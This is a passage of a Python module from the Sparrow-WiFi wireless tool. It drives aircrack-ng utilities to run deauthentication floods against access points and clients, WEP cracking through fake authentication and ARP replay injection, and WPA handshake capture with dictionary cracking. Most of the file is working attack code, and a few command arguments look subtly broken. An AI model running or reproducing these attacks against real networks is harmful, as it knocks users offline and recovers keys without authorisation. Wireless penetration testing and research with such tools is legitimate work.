#!/usr/bin/python3
# 
###################################################################
#
# Application: Sparrow-WiFi
# Module: falconwifi.py
# Author: ghostop14
# Copyright 2017 ghostop14, All Rights Reserved
#
##################################################################
#


import subprocess
import signal
import os
import csv
import json
import datetime
from dateutil import parser
import re
from time import sleep
from threading import Thread, Lock

import sys
if '..' not in sys.path:
    sys.path.insert(0, '..')
    
from wirelessengine import WirelessEngine, WirelessNetwork, WirelessClient
from sparrowgps import SparrowGPS

# ------------------  Falcon Remote Agent Functionality and Abstraction ------------------------------
class FalconWiFiRemoteAgent(object):
    def __init__(self):
        super().__init__()

        self.activeDeauths = {}
        self.deauthLock = Lock()
        
        self.WPAPSKCrackList = {}
        self.WEPCrackList = {}

    def getAllDeauthsAsJsonDict(self):
        responseDict = {}
        responseList = []
        for curKey in self.activeDeauths:
            responseList.append(self.activeDeauths[curKey].toJsondict())
            
        responseDict['activedeauths'] = responseList
        
        return responseDict
            
    def stopAllDeauths(self, interface):
        self.deauthLock.acquire()
        for curKey in self.activeDeauths:
            curDeauth = self.activeDeauths[curKey]
            if curDeauth.interface == interface:
                curDeauth.kill()
                del self.activeDeauths[curKey]
                
        self.deauthLock.release()
                
    def stopDeauth(self, apMacAddr, clientMacAddr, curInterface, channel):
        potentialKey = FalconDeauth.testKey(apMacAddr, clientMacAddr, channel)
        if potentialKey in self.activeDeauths:
            self.deauthLock.acquire()
            curDeauth = self.activeDeauths[potentialKey]
            # Kill the process
            curDeauth.kill()
            # Remove it from our running dictionary
            try:
                del self.activeDeauths[potentialKey]
            except:
                pass
                
            self.deauthLock.release()
        
    def deauthAccessPoint(self, apMacAddr, curInterface, channel, continuous):
        curNet = WirelessNetwork()
        curNet.macAddr = apMacAddr
        curNet.channel = channel
        
        potentialKey = FalconDeauth.testKey(apMacAddr, "", channel)
        if potentialKey not in self.activeDeauths:
            newDeauth = FalconWirelessEngine.deauthClient(curNet, curInterface, curNet.channel, continuous)

            # Note: If continuous is False, deauthClient will return None since the process will die after a single shot
            if (newDeauth is not None) and continuous:
                self.deauthLock.acquire()
                self.activeDeauths[newDeauth.getKey()] = newDeauth
                self.deauthLock.release()
                
                return True
            else:
                return False
        else:
            # Deauth already running
            return True
            
    def deauthAccessPointAndClient(self, apMacAddr, clientMacAddr, curInterface, channel, continuous):
        curClient = WirelessClient()
        curClient.macAddr = clientMacAddr
        curClient.apMacAddr = apMacAddr
        curClient.channel = channel
        
        potentialKey = FalconDeauth.testKey(apMacAddr, clientMacAddr, channel)
        if potentialKey not in self.activeDeauths:
            newDeauth = FalconWirelessEngine.deauthClient(curClient, curInterface, curClient.channel, continuous)

            # Note: If continuous is False, deauthClient will return None since the process will die after a single shot
            if (newDeauth is not None) and continuous:
                # NOTE: deauth will also contain the interface that the deauth is running on
                self.deauthLock.acquire()
                self.activeDeauths[newDeauth.getKey()] = newDeauth
                self.deauthLock.release()
                
                return True
            else:
                return False
        else:
            # Deauth already running
            return True
            
    def cleanup(self):
        # Stop any running cracks
        for curInterface in self.WEPCrackList.keys():
            self.WEPCrackList[curInterface].stopCrack()
            self.WEPCrackList[curInterface].cleanupTempFiles()
            
        self.WEPCrackList.clear()
        
        for curInterface in self.WPAPSKCrackList.keys():
            self.WPAPSKCrackList[curInterface].stopCrack()
            self.WPAPSKCrackList[curInterface].cleanupTempFiles()
        
        self.WPAPSKCrackList.clear()
        
        # Clean up any monitoring scans running on exit
        monitoringInterfaces = WirelessEngine.getMonitoringModeInterfaces()
        
        for curInterface in monitoringInterfaces:
            if self.isScanRunning(curInterface):
                self.stopCapture(curInterface)
                
        self.deauthLock.acquire()
        for curKey in self.activeDeauths.keys():
            curDeauth = self.activeDeauths[curKey]
            
            # Kill try/except's so it won't throw an unhandled exception
            curDeauth.kill()
        self.deauthLock.release()
        
        FalconWirelessEngine.airodumpStop('all')
        
    def toolsInstalled(self):
        return FalconWirelessEngine.aircrackInstalled()

    def isScanRunning(self, interface):
        return FalconWirelessEngine.isAirodumpRunning(interface)

    def getNetworksAsJson(self, gpsData):
        # This reads the scan file
        airodumpcsvfile = '/dev/shm/falconairodump-01.csv'
        
        retVal = {}
        retVal['errCode'] = 0
        retVal['errString'] = ''
        
        if os.path.isfile(airodumpcsvfile):
            networks, clients = FalconWirelessEngine.parseAiroDumpCSV(airodumpcsvfile)
            errCode = 0
            errmsg = ''
        else:
            errCode = 1
            errmsg = 'Temp scan file not found.  Scan may not be running.'
            retVal['errCode'] = errCode
            retVal['errString'] = errmsg
            networks = {}
            clients = {}

        
        netList = []
        
        if networks:
            for curKey in networks.keys():
                curNet = networks[curKey]
                if gpsData is not None:
                    curNet.gps.copy(gpsData)
                netList.append(curNet.toJsondict())
            
        clientList = []
        
        if clients:
            for curKey in clients.keys():
                curClient = clients[curKey]
                if gpsData is not None:
                    curClient.gps.copy(gpsData)
                clientList.append(curClient.toJsondict())
            
        gpsdict = {}
        
        gpsloc = SparrowGPS()
        if (gpsData is not None):
            gpsloc.copy(gpsData)
        
        gpsdict['latitude'] = gpsloc.latitude
        gpsdict['longitude'] = gpsloc.longitude
        gpsdict['altitude'] = gpsloc.altitude
        gpsdict['speed'] = gpsloc.speed
        retVal['gps'] = gpsdict
        
        retVal['networks'] = netList
        retVal['clients'] = clientList
        
        jsonstr = json.dumps(retVal)
        
        return errCode, errmsg, jsonstr
        
    def startCapture(self, interface):
        # Make sure there's no existing capture running
        FalconWirelessEngine.airodumpStop(interface)

        # Clean up any temp files:
        # Note: start cleans up any pre-existing temp files before starting.
        
        # Now start a new one
        return FalconWirelessEngine.airodumpStart(interface)
        
    def stopCapture(self, interface):
        return FalconWirelessEngine.airodumpStop(interface)

    def getScanResults(self):
        self.airodumpcsvfile = '/dev/shm/falconairodump-01.csv'
        networks, clients = FalconWirelessEngine.parseAiroDumpCSV(self.airodumpcsvfile)
        
        return networks, clients

    def startMonitoringInterface(self, interface):
        retVal = FalconWirelessEngine.airmonStart(interface)
        
        errMsg = ""
        
        if (retVal != 0):
                errMsg = "Error code " + str(retVal) + " switching " + interface + " to monitoring mode.  You can try it manually from a command-line with 'airmon-ng start " + interface + "'"

        return retVal, errMsg
        
    def stopMonitoringInterface(self, interface):
        retVal = FalconWirelessEngine.airmonStop(interface)
        
        errMsg = ""
        
        if (retVal != 0):
                errMsg = "Error code " + str(retVal) + " stopping " + interface + " monitoring mode.  You can try it manually from a command-line with 'airmon-ng stop " + interface + "'"

        return retVal, errMsg
        
# ------------------  WEP Crack Thread ------------------------------
class WEPCrackThread(Thread):
    def __init__(self, apMacAddr):
        super().__init__()
        self.signalStop = False
        self.threadRunning = False
        self.apMacAddr = apMacAddr
        self.ivcount = 0
        self.passwords = []
        
    def run(self):
        self.threadRunning = True
        
        while (not self.signalStop):
            retVal, self.passwords, self.ivcount = FalconWirelessEngine.testWEPCapture(self.apMacAddr,'/tmp/falconwepcap-01.cap')
            # This process just plain takes a while.  No sense burdening the CPU continuously
            
            # Just keep an eye out for stop signal
            i=0
            while i < 5 and not self.signalStop:
                i += 1
                sleep(0.2)
            
        self.threadRunning = False
        
# ------------------  Crack Base Class ------------------------------
class CrackBase(object):
    def __init__(self):
        self.tmpFileRoot = 'falconcap'
        self.apMacAddr = ""
        self.SSID = ""
        self.interface = ""
        self.channel = 0
        
        self.captureProc = None
        self.attackProc1 = None
        self.attackProc2 = None
        self.crackRunning = False
        
    def isRunning(self):
        # Derived classes will need to override this
        return False
        
    def getCrackedPasswords(self):
        # Derived classes will need to override this
        return []
        
    def cleanupTempFiles(self):
        tmpDir = '/tmp'
        try:
            for f in os.listdir(tmpDir):
                if f.startswith(self.tmpFileRoot):
                    try:
                        os.remove(tmpDir + '/' + f)
                    except:
                        pass
        except:
            pass
        
        tmpDir = '/dev/shm'
        try:
            for f in os.listdir(tmpDir):
                if f.startswith(self.tmpFileRoot):
                    try:
                        os.remove(tmpDir + '/' + f)
                    except:
                        pass
        except:
            pass
            
    def startCrack(self, curInterface, channel, ssid, apMacAddr, hasClient=False):
        # overload in inherited class
        self.crackRunning = True
        self.interface = curInterface
        self.channel = channel
        self.SSID = ssid
        
    def stopCrack(self):
        if self.attackProc2:
            try:
                self.attackProc2.kill()
                self.attackProc2 = None
            except:
                pass
                
        if self.attackProc1:
            try:
                self.attackProc1.kill()
                self.attackProc1 = None
            except:
                pass
                
        if self.captureProc:
            try:
                self.captureProc.kill()
                self.captureProc = None
            except:
                pass
                
        self.crackRunning = False

def TwoDigits(instr):
    # Fill in a leading zero for single-digit numbers
    while len(instr) < 2:
        instr = '0' + instr
        
    return instr

# ------------------  WPA PSK Crack Class ------------------------------
class WPAPSKCrack(CrackBase):
    def __init__(self):
        super().__init__()
        self.tmpFileRoot = 'falconwpacap'
                
    def copyCaptureFile(self, directory):
        if  not os.path.exists(directory):
            os.makedirs(directory)
            
        now = datetime.datetime.now()
        
        filename = 'wpapskhash_' + str(now.year) + "-" + TwoDigits(str(now.month)) + "-" + TwoDigits(str(now.day))
        filename += "_" + TwoDigits(str(now.hour)) + "_" + TwoDigits(str(now.minute)) + "_" + TwoDigits(str(now.second)) + ".cap"
        fullpath = directory + '/' + filename
        
        os.system('mv /tmp/falconwpacap-01.cap ' + fullpath)
        
        return fullpath, filename

    def isRunning(self):
        if self.captureProc:
            return True
        else:
            return False
            
    def startCrack(self, curInterface, channel, ssid, apMacAddr, hasClient=False):
        self.SSID = ssid
        self.apMacAddr = apMacAddr
        self.interface = curInterface
        self.channel = channel
        
        # Start the capture
        filebase = '/tmp/' + self.tmpFileRoot
        self.captureProc = FalconWirelessEngine.startCapture(curInterface, channel, filebase, apMacAddr, type="WPA")

        if not self.captureProc:
            return False, "Unable to start the packet capture process."
            
        # Give it a chance to start and change the channel
        sleep(0.1)
        
        self.crackRunning = True
        
        return True, ""
        
    def hasHandshake(self):
        retVal = FalconWirelessEngine.testWPACapture(self.apMacAddr, self.SSID,'/tmp/' + self.tmpFileRoot + '-01.cap')
        
        return retVal
        
# ------------------  WEP Crack Class ------------------------------
class WEPCrack(CrackBase):
    def __init__(self):
        super().__init__()
        
        self.tmpFileRoot = 'falconwepcap'
        self.resultCheckThread = None

    def isRunning(self):
        if self.resultCheckThread:
            return True
        else:
            return False
            
    def getCrackedPasswords(self):
        if self.resultCheckThread:
            return self.resultCheckThread.passwords
        else:
            return []
    
    def getIVCount(self):
        if self.resultCheckThread:
            return self.resultCheckThread.ivcount
        else:
            return 0
        
    def stopCrack(self):
        # Stop the WEP capture check thread
        self.stopCaptureCheck()
        
        # Stop all other attack and capture processes
        super().stopCrack()

        # Clean up any replay tmp files
        tmpDir = '.'
        try:
            for f in os.listdir(tmpDir):
                if f.startswith('replay_arp-') and f.endswith('.cap'):
                    try:
                        os.remove(tmpDir + '/' + f)
                    except:
                        pass
        except:
            pass
        
    def startCrack(self, curInterface, channel, ssid, apMacAddr, hasClient=False):
        self.SSID = ssid
        self.apMacAddr = apMacAddr
        self.interface = curInterface
        self.channel = channel
       
        # Start the capture
        filebase = '/tmp/' + self.tmpFileRoot
        self.captureProc = FalconWirelessEngine.startCapture(curInterface, channel, filebase, apMacAddr, type="wep-ivs")

        if not self.captureProc:
            return False, "Unable to start the packet capture process."
            
        # Give it a chance to start and change the channel
        sleep(0.1)
        
        if not hasClient:
            # Target the AP with fake authentication
            self.attackProc1, self.attackProc2, errMsg = FalconWirelessEngine.forceWEPIVs(curInterface, ssid, apMacAddr)
            
            if self.attackProc1 is None or self.attackProc2 is None:
                try:
                    self.captureProc.kill()
                    self.captureProc = None
                except:
                    pass
                    
                return False, "Unable to start injection process:" + errMsg
        else:
            self.attackProc2 = None
            # Capture the client's ARP and play it back interactively
            self.attackProc1, errMsg = FalconWirelessEngine.forceWEPIVsWithClient(curInterface, apMacAddr)
            
            if self.attackProc1 is None:
                try:
                    self.captureProc.kill()
                    self.captureProc = None
                except:
                    pass
                    
                return False, "Unable to start injection process:" + errMsg
            
        # poll() returns None when a process is running, otherwise the result is an integer
        pollrunning = self.attackProc1.poll() is None
        
        if not pollrunning:
            try:
                self.captureProc.kill()
                self.captureProc = None
            except:
                pass
                
            if self.attackProc2:
                try:
                    self.attackProc2.kill()
                    self.attackProc2 = None
                except:
                    pass
                    
            return False, 'Fake authentication process died prematurely.'
        
        if not hasClient:
            # Wait for process to start
            sleep(0.2)
            
            pollrunning = self.attackProc2.poll() is None
            
            if not pollrunning:
                try:
                    self.captureProc.kill()
                    self.captureProc = None
                except:
                    pass
                   
                return False, "The ARP injection process appears to have died prematurely."
        
        self.crackRunning = True
        self.apMacAddr = apMacAddr
        self.SSID = ssid
        
        self.resultCheckThread = WEPCrackThread(apMacAddr)
        self.resultCheckThread.start()
        
        return True, ""

    def stopCaptureCheck(self):
        if self.resultCheckThread:
            self.resultCheckThread.signalStop = True
            
            while self.resultCheckThread.threadRunning:
                sleep(0.2)
                
            self.resultCheckThread = None
            
# ------------------  Deauth Class ------------------------------
class FalconDeauth(object):
    def __init__(self):
        self.processid = 0
        self.channel = 0
        self.stationMacAddr = ""
        self.apMacAddr = ""
        self.interface = ""
        
    def __str__(self):
        retVal = ""
        
        retVal += "Station MAC Address: " + self.stationMacAddr + "\n"
        retVal += "Associated Access Point Mac Address: " + self.apMacAddr + "\n"
        retVal += "Channel: " + str(self.channel) + "\n"
        retVal += "Interface: " + self.interface + "\n"
        
        if (self.processid > 0):
            retVal += "Deauth process id: " + str(self.processid) + "\n"
        else:
            retVal += "Deauth process id: None\n"
            
        return retVal
        
    def __eq__(self, obj):
        # This is equivance....   ==
        if not isinstance(obj, FalconDeauth):
           return False
          
        if self.stationMacAddr != obj.stationMacAddr:
            return False
            
        if self.apMacAddr != obj.apMacAddr:
            return False

        if self.interface != obj.interface:
            return False

        if self.channel != obj.channel:
            return False
            
        if self.processid != obj.processid:
            return False
            
        return True

    def __ne__(self, other):
            return not self.__eq__(other)
        
    def getKey(self):
        return (self.apMacAddr + self.stationMacAddr + "_" + str(self.channel))
        
    def testKey(apMacAddr, stationMacAddr, channel):
        return (apMacAddr + stationMacAddr + "_" + str(channel))
        
    def kill(self):
        if (self.processid > 0):
            try:
                os.kill(self.processid, signal.SIGINT)
            except:
                pass
        
            self.processid = 0
        
    def fromJsondict(self, dictjson):
        # Note: if the json dictionary isn't correct, this will naturally throw an exception that may
        # need to be caught for error detection
        self.apMacAddr = dictjson['apmacaddr']
        self.stationMacAddr = dictjson['stationmacaddr']
        self.channel = dictjson['channel']
        self.interface = dictjson['interface']
        self.processid = dictjson['processid']

    def fromJson(self, jsonstr):
        dictjson = json.loads(jsonstr)
        self.fromJsondict(dictjson)
        
    def toJsondict(self):
        dictjson = {}
        dictjson['type'] = 'wifi-deauth'
        dictjson['apmacaddr'] = self.apMacAddr
        dictjson['stationmacaddr'] = self.stationMacAddr
        dictjson['channel'] = self.channel
        dictjson['interface'] = self.interface
        dictjson['processid'] = self.processid
        
        return dictjson
        
    def toJson(self):
        dictjson = self.toJsondict()
        return json.dumps(dictjson)
        
# ------------------  FalconWirelessEngine Class ------------------------------
class FalconWirelessEngine(object):
    def __init__(self):
        pass

    def processRunning(processPattern):
        result = subprocess.run(['pgrep', '-f',processPattern], stdout=subprocess.PIPE,stderr=subprocess.DEVNULL)

        # it's a grep, so if the pattern exists, pgrep returns 0, else it returns 1 (or something greater than 0 as an err_not_found
        if result.returncode == 0:
            return True
        else:
            return False
        
    def isAirodumpRunning(interface):
        processPattern = 'airodump-ng.*' + interface + '.*falconairodump'
        return FalconWirelessEngine.processRunning(processPattern)
            
    def aircrackInstalled():
        if  (not os.path.isfile('/usr/sbin/airodump-ng')) and (not os.path.isfile('/usr/local/sbin/airodump-ng')):
            return False

        if  (not os.path.isfile('/usr/bin/aircrack-ng')) and (not os.path.isfile('/usr/local/bin/aircrack-ng')):
            return False
            
        return True
        
    def testWEPCapture(apMacAddr, capFile):
        # aircrack-ng -a2 -b D8:EB:97:2F:DD:CE -w /opt/wordlists/TopPasswords3-2.txt falconcap-01.cap
        params = ['aircrack-ng','-f','4','-1','-b',  apMacAddr, capFile]
            
        result = subprocess.run(params, stdout=subprocess.PIPE,stderr=subprocess.DEVNULL)
        testResult = result.stdout.decode('ASCII')
        
        iv=re.compile(' +([0-9]+) IVs')
        
        regexresult=iv.search(testResult)
        
        if regexresult:
            try:
                ivstr = regexresult.group(1)
                ivstr = ivstr.replace('IVs', '')
                ivstr = ivstr.replace(' ', '')
                ivcount = int(ivstr)
            except:
                ivcount = 0
        else:
            ivcount = 0
        
        # Please specify a dictionary comes back when aircrack-ng recognizes it as WPA, not wep,
        # No matching network found means you have the wrong bssid or a packet hasn't been seen yet
        if result.returncode == 0 and 'KEY FOUND' in testResult:
            passwords = []
            
            p = re.compile('KEY FOUND\! \[(.*?)\].*')

            lines = testResult.split('\n')
            
            for curLine in lines:
                try:
                    if 'KEY FOUND' in curLine:
                        fieldValue = p.search(curLine).group(1)
                    else:
                        fieldValue = ""
                except:
                    fieldValue = ""
                    
                if len(fieldValue) > 0:
                    fieldValue = fieldValue.strip()
                    if fieldValue not in passwords:
                        passwords.append(fieldValue)

            return True, passwords, ivcount
        else:
            return False, [], ivcount
                
    def testWPACapture(apMacAddr, ssid, capFile):
        # First see if we have wpapcap2john.  It's better than aircrack at extracting the hashes
        if (os.path.isfile('/usr/local/bin/wpapcap2john') or os.path.isfile('/usr/bin/wpapcap2john') ):
            params = ['wpapcap2john',  capFile]
            result = subprocess.run(params, stdout=subprocess.PIPE,stderr=subprocess.DEVNULL)
            testResult = result.stdout.decode('ASCII')
            
            # So wpapcap2john writes the hash output to stdout ,but summary info goes to stderr.
            # For instance:
            # CompletedProcess(args=['wpapcap2john', '/tmp/falconwpacap-01.cap'], returncode=0, stdout=b'', 
            #                       stderr=b'File falconwpacap-01.cap: raw 802.11\n\n1 ESSIDS processed and 0 AP/STA pairs processed\n0 handshakes written\n')
            if (ssid in testResult):
                return True
            else:
                return False
        else:
            tmpFile = "/tmp/falconwpatestpass.txt"
            
            if  not os.path.isfile(tmpFile):
                with open(tmpFile, 'w') as f:
                    f.write('test\n')
                    
            # aircrack-ng -a2 -b D8:EB:97:2F:DD:CE -w /opt/wordlists/TopPasswords3-2.txt falconcap-01.cap
            params = ['aircrack-ng', '-a2', '-b',  apMacAddr, '-w', tmpFile]
            if len(ssid) > 0:
                params.append('-e')
                params.append(ssid)
                
            params.append(capFile)
            
            result = subprocess.run(params, stdout=subprocess.PIPE,stderr=subprocess.DEVNULL)
            testResult = result.stdout.decode('ASCII')
            if 'No valid WPA handshakes found' in testResult:
                return False
            else:
                if (result.returncode == 0) and ('keys tested' in testResult) and ('0 keys tested' not in testResult):
                    return True
                else:
                    return False
        
    def crackWPACapture(apMacAddr, ssid, dictionary, capFile):
        params = ['aircrack-ng', '-a2', '-b',  apMacAddr, '-w', dictionary]
        if len(ssid) > 0:
            params.append('e')
            params.append(ssid)
            
        params.append(capFile)
        
        result = subprocess.run(params, stdout=subprocess.PIPE,stderr=subprocess.DEVNULL)
        testResult = result.stdout.decode('ASCII')
        if 'No valid WPA handshakes found' in testResult:
            return False, []
        else:
            if result.returncode == 0 and 'KEY FOUND' in testResult:
                passwords = []
                
                p = re.compile('KEY FOUND\! \[(.*?)\].*')

                lines = testResult.split('\n')
                
                for curLine in lines:
                    try:
                        if 'KEY FOUND' in curLine:
                            fieldValue = p.search(curLine).group(1)
                        else:
                            fieldValue = ""
                    except:
                        fieldValue = ""
                        
                    if len(fieldValue) > 0:
                        fieldValue = fieldValue.strip()
                        if fieldValue not in passwords:
                            passwords.append(fieldValue)

                return True, passwords
            else:
                return False, []
        
    def startCapture(interface, channel, outputFile, apMacAddr="", type=""):
        # Type can go straight to airodump-ng's type parameter,
        # but if you specify 'wep-ivs' this function will know to only capture wep IV's for
        # cracking and use the --ivs parameter to airodump.
        params = ['airodump-ng', '--channel', str(channel),'--write', outputFile, interface]
        if len(apMacAddr) > 0:
            params.append('--bssid')
            params.append(apMacAddr)
        
        if type == 'wep-ivs':
                # params.append('--ivs')
                pass
                # The PTW method that requires many less IV's doesn't work with the --ivs IV only approach.  Need the full capture.
        else:
            if (len(type) > 0):
                params.append('-t')
                params.append(type)
            
        newProc = subprocess.Popen(params,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        
        return newProc

    def forceWEPIVsWithClient(interface, apMacAddr):
        # Channel will be set with the call to capture
        params = ['aireplay-ng', '--interactive','-b',apMacAddr, '-d', 'FF:FF:FF:FF:FF:FF', 'f', '1', '-m', '68', '-n', '86', interface]
            
        # aireplay-ng --interactive -b 00:14:6C:7E:40:80 -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 ath0
        newProc = subprocess.Popen(params,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        
        pollrunning = newProc.poll() is None
        
        if not pollrunning:
            output = newProc.communicate()
            
            if output[0]:
                # Stdout
                errMsg = output[0]
            else:
                errMsg = 'Unknown error starting ARP request replay: ' + str(params)
        else:
            errMsg = ""
            
        return newProc, errMsg

    def forceWEPIVs(interface, SSID, apMacAddr):
        # Channel will be set with the call to capture
        # Note: In the params below, the hard-coded mac address is correct.  It just needs a fake mac for this process
        # params = ['aireplay-ng', '-D','--fakeauth=30','-e', '"'+SSID+'"', '-a', apMacAddr, '-h', '00:06:25:c1:E5:38', interface]
        mymacaddr = WirelessEngine.getMacAddress(interface)
        
        if len(mymacaddr) == 0:
            return None, None, "Unable to retrieve local mac address"
            
        # Use aireplay-ng to do a fake authentication with the access point
        #quotedSSID = '"' + SSID + '"'
        # quotedSSID = SSID
        # NOTE: Don't quote the SSID, it'll pass the quotes along as part of the SSID and fail.
        params = ['aireplay-ng', '-1', '6000', '-o', '1', '-q', '10', '-e', SSID, '-a', apMacAddr, '-h', mymacaddr, interface]    
        
        newProc1 = subprocess.Popen(params,stdout=subprocess.PIPE,stderr=subprocess.PIPE)

        # poll() returns None when a process is running, otherwise the result is an integer
        pollrunning = newProc1.poll() is None
        
        if not pollrunning:
            output = newProc1.communicate()
            
            if output[0]:
                # Stdout
                errMsg = output[0]
            else:
                errMsg = 'Unknown error'
            newProc1 = None
            newProc2 = None
            return None, None, errMsg

        # Start aireplay-ng in ARP request replay mode
        params = ['aireplay-ng', '-3', '-b', apMacAddr, '-h', mymacaddr, interface]    
        
        newProc2 = subprocess.Popen(params,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        
        pollrunning = newProc2.poll() is None
        
        if not pollrunning:
            output = newProc2.communicate()
            
            if output[0]:
                # Stdout
                errMsg = output[0]
            else:
                errMsg = 'Unknown error starting ARP request replay: ' + str(params)
        else:
            errMsg = ""
                
        return newProc1, newProc2, errMsg
        
    def checkWEPCaptureForIVs(captureFile):
        result = subprocess.run(['aircrack-ptw', captureFile], stdout=subprocess.PIPE,stderr=subprocess.DEVNULL)
        wirelessResult = result.stdout.decode('ASCII')
        
        # For now, we'll need to key off of a successful message
        return wirelessResult
        
    def stopCapture(captureProc):
        if captureProc:
            captureProc.kill()
        
    def deauthClient(client, interface, channel, continuous=False, printdebug=False):
        # client can be:
        # 1. WirelessClient object (uses both wirelessClient.macAddr and wirelessClient.apMacAddr)
        # 2. WirelessNetwork object (uses wirelessNetwork.macAddr)
        #
        # Returns a deauth object for continuous deauth which contains the ap mac addr, client mac (if available), channel, 
        # and the process id.  For continuous=False or an error, None is returned.
        
        if not client:
            return
            
        if (type(client) == WirelessClient) and ('associated' in client.apMacAddr):
                return None
            
        if (not channel) or (channel < 1):
            # Filter 0's and -1's as error conditions.
            return None
            
        newDeauth = FalconDeauth()
        
        if type(client) == WirelessClient:
            newDeauth.stationMacAddr= client.macAddr
            newDeauth.apMacAddr  = client.apMacAddr
        else:
            newDeauth.stationMacAddr= ""
            newDeauth.apMacAddr  = client.macAddr
            
        newDeauth.channel = channel
        newDeauth.interface = interface
        
        if (continuous):
            # 0 means continuous
            deauthCount = 0
        else:
            # From https://www.aircrack-ng.org/doku.php?id=deauthentication:
            # 1 actually sends For directed deauthentications, aireplay-ng sends out a total of 128 packets for each deauth you specify. 
            # 64 packets are sent to the AP itself and 64 packets are sent to the client.
            deauthCount = 1
        
        retVal = FalconWirelessEngine.setChannel(interface, channel)
        if retVal == 0:
            # Note: This process doesn't always work.  Not all clients respond to deauths, or they reconnect so quickly
            # that you don't notice the deauth.
            if len(newDeauth.stationMacAddr) > 0:
                params = ['aireplay-ng', '-0', str(deauthCount),'-c',client.macAddr, '-a', client.apMacAddr, interface]
            else:
                params = ['aireplay-ng', '-0', str(deauthCount),'-a', client.macAddr, interface]
                
            if printdebug:
                newProc = subprocess.Popen(params)
            else:
                newProc = subprocess.Popen(params, stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
                
            if newProc and continuous:
                newDeauth.processid = newProc.pid
            else:
                newDeauth.processid = 0
        else:
            return None
            
        if continuous:
            return newDeauth
        else:
            # If we're not continuous, this process is going to die after one pass
            return None

    def setChannel(interface, channel):
        result = subprocess.run(['iwconfig', interface, 'channel', str(channel)], stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

        return result.returncode

    # Creating a monitor interface based on a wireless interface
    def airmonStart(interface):
        # Checking for processes and configs
        result = subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        # returncode will be 0 on success.  This is airmon-ng's result code
        return result.returncode
        
    def airmonStop(interface):
        # Checking for processes and configs
        result = subprocess.run(['airmon-ng', 'stop', interface], stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        # returncode will be 0 on success.  This is airmon-ng's result code
        return result.returncode
        
    # Starting/stopping monitoring
    def airodumpStart(interface, bands='ag', tmpDir='/dev/shm', basename='falconairodump'):
        # Returns a process object on success, None on Failure
        # Clean up tmp files
        try:
            for f in os.listdir(tmpDir):
                if f.startswith(basename):
                    try:
                        os.remove(tmpDir + '/' + f)
                    except:
                        pass
        except:
            pass
            
        try:
            # Adding , stdin=subprocess.DEVNULL will allow the new version of airodump to recognize it's running in the background.
            scanProc = subprocess.Popen(['airodump-ng', interface, '-b',bands,'--output-format', 'csv', '--write', tmpDir + '/falconairodump', '--write-interval', '2'], 
                                    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            return scanProc
        except:
            None

    def airodumpStop(interface, tmpDir='/dev/shm', basename='falconairodump', deleteTmpFiles=True):
        # NOTE:  IF YOU SET interface='all' THEN ALL AIRODUMP-NG RUNS WILL BE STOPPED
        
        # For most apps, this would be the way to do it.  For airodump, send CTL-C:
        # if scanProc:
        #    os.kill(scanProc.pid, signal.SIGINT)
        
        # Or kill:
        # scanProc.kill()
        
        # However both are causing the GUI on Ubuntu to crash.  Must be something in airodump-ng or a driver.
        # So take a safer way:
        if interface == 'all':
            curInterface = ''
        else:
            curInterface = interface
            
        result = subprocess.run(['pkill', '-f','airodump-ng.*'+curInterface], stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        
        if deleteTmpFiles:
            # Clean up tmp files
            try:
                for f in os.listdir(tmpDir):
                    if f.startswith(basename):
                        try:
                            os.remove(tmpDir + '/' + f)
                        except:
                            pass
            except:
                pass
        
        return result.returncode

    def parseAiroDumpCSV(airodumpcsvfile):
        
        raw_list = []
        
        if (os.path.isfile(airodumpcsvfile)):
            try:
                with open(airodumpcsvfile, 'r') as f:
                    lines = []
                    for line in f.readlines():
                        curline=line.replace('\0','<NULL>')
                        lines.append(curline)
        
                    # reader = csv.reader(f)
                    reader = csv.reader(lines)
                    raw_list = list(reader)
            except:
                return None, None
                
        # First row will be blank
        # Networks will start with a header row starting with 'BSSID'
        # Client stations will start with a header row starting with 'Station MAC'
        
        # Remove blank lines:
        while [] in raw_list:
            raw_list.remove([])
            
        if (len(raw_list) < 2): # Need a header and at least one of something
            return None, None
            
        # Now the first row should be networks
        inNetSection = False
        if raw_list[0][0] == 'BSSID':
            inNetSection = True

        # Skip the first header
        curLine = 1
        
        networks = {}
        
        if inNetSection:
            while (raw_list[curLine][0] != 'Station MAC') and (curLine < len(raw_list)):
                try:
                    # This could happen if we happened to read a partial line and an index reference is bad.
                    newNet = FalconWirelessEngine.createNetworkFromList(raw_list[curLine])
                    networks[newNet.getKey()] = newNet
                except:
                    pass
                curLine += 1
                
        clients = {}
        
        # -1 in if is to ensure we have an entry
        if (curLine < (len(raw_list)-1) and (raw_list[curLine][0] == 'Station MAC')):
            curLine += 1
            while curLine < len(raw_list):
                try:
                    # This could happen if we happened to read a partial line and an index reference is bad.
                    newClient = FalconWirelessEngine.createClientFromList(raw_list[curLine])
                    clients[newClient.getKey()] = newClient
                except:
                    pass
                    
                curLine += 1
                
        return networks, clients

    def createClientFromList(listEntry):
        # Fields:
        # (0) Station MAC, (1) First time seen, (2) Last time seen, (3) Power, (4) # packets, (5) BSSID, (6-length) Probed ESSIDs
        wirelessClient = WirelessClient()

        wirelessClient.macAddr = listEntry[0].lower()
        wirelessClient.firstSeen = parser.parse(listEntry[1])
        wirelessClient.lastSeen = parser.parse(listEntry[2])
        try:
            wirelessClient.signal = int(listEntry[3])
        except:
            wirelessClient.signal = -100
            
        if wirelessClient.signal == -1:
            # For some reason some come back as -1.  I can guarantee those devices are not putting out -1 dBm so it must be an "unknown" value
            wirelessClient.signal = -1000
        
        wirelessClient.apMacAddr = listEntry[5].strip().lower()
        for i in range(6, len(listEntry)):
            if (len(listEntry[i]) > 0):
                wirelessClient.probedSSIDs.append(listEntry[i])
            
        return wirelessClient
        
    def createNetworkFromList(listEntry):
        # Fields:
        # (0) BSSID, (1) First time seen, (2) Last time seen, (3) channel, (4) Speed, (5) Privacy, (6) Cipher, (7) Authentication, (8) Power, (9) # beacons, 
